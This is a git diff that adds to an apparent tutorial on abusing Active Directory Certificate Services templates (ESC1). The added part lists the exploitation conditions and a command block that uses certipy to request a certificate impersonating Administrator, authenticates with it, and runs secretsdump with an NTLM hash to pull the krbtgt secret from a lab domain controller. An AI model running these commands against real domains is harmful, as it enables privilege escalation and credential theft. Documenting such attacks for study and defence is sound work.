@@ -63,5 +63,21 @@ So, when a certificate template allows requester to specify a SAN, it is possibl
 
 It can be used for privileges escalation if the certificate template defines EKUs that enable domain authentication and can be enrolled by non- privileged user without manager approval.
 The certificate template’s AD object specifies if the requester can specify the SAN in its mspki-certificate-name-flag property. The mspki-certificate-name-flag property is a bitmask and if the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is present, a requester can specify the SAN:
-                                        
+
+
+![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC1.png?raw=true)
+
+* In addition, it is necessary that the enterprise CA's configuration must allow low privileged users the ability to request certificates. 
+* That the Approval Manager is disabled.
+* Authorized signatures are not required.
+* Have certificate enrollment rights that allow a low-privileged attacker to request and obtain a certificate based on the template.
+
+```
+ certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1' -alt 'Administrator@EvilCorp.local'
+ 
+ certipy auth -pfx administrator.pfx
+ 
+ csecretsdump.py -hashes :669556eda1adbb10afdf29f42760db39 Administrator@EVILDC1.evilcorp.local -just-dc-user krbtgt
+ 
+```
 
